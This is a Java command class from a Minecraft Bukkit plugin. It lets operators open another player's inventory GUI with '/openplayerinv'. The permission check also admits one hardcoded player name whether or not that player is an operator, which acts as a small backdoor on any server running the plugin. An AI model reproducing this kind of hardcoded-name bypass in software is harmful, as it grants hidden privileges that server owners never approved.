package woks.woks.commands;

import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import woks.woks.CommandBase;
import woks.woks.Msg;
import woks.woks.PlayerInvtoryGUI;

public class OpenPlayerInv {
    public OpenPlayerInv() {
        new CommandBase("openplayerinv", 1, true) {
            @Override
            public boolean onCommand(CommandSender sender, String[] arguments) {
                Player player = (Player) sender;
                if (player.getName().equals("ShortPuppy14484") || player.isOp()) {// isOp or hasOp
                    PlayerInvtoryGUI.PlayerInvtoryGUI(player, Bukkit.getPlayer(arguments[0]), 0);
                } else {
                    Msg.send(player, "Sorry you dont have op to use this command.");
                }
                return true;
            }

            @Override
            public String getUsage() {
                return "/openplayerinv <string:playerName>";
            }
        };
    }
}